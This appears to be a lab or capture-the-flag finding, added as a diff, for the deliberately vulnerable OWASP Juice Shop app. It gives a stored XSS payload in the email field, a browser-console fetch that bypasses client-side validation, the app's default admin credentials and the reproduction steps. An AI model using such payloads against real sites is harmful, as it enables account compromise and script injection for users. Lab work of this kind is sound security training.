@@ -1,0 +1,37 @@
+POST /api/Users
+Payload (stored in the new account's email field):
+<iframe src="javascript:alert(`xss`)">
+
+Reproduce:
+1. Open http://localhost:3000 and press F12 -> Console. Run:
+
+   fetch('/api/Users', {
+     method: 'POST',
+     headers: { 'Content-Type': 'application/json' },
+     body: JSON.stringify({
+       email: '<iframe src="javascript:alert(`xss`)">',
+       password: 'XSSed123',
+       passwordRepeat: 'XSSed123'
+     })
+   }).then(r => r.text()).then(console.log)
+
+   A 201 / {"status":"success"} response means the account (and payload) was stored.
+
+2. Log in as the administrator: admin@juice-sh.op / admin123
+   (or use the admin session obtained from the JUICE-001 SQL injection).
+
+3. Open http://localhost:3000/#/administration
+
+4. alert(`xss`) fires on page load. If it does not, hard-reload (Ctrl+F5) while
+   on /#/administration.
+
+Why it works:
+- The registration form validates the email format in the browser, so the payload
+  cannot be typed into the UI. POST /api/Users only trims the value, so the API
+  call bypasses that client-side check and stores the payload verbatim.
+- The admin user table renders every email with [innerHTML]
+  (bypassSecurityTrustHtml), so the iframe executes when the page loads.
+- Juice Shop's Score Board labels this "Client-side XSS Protection". The lab
+  records it as XSS - Stored.
+
+Evidence: screenshot the alert dialog with the /#/administration URL visible.
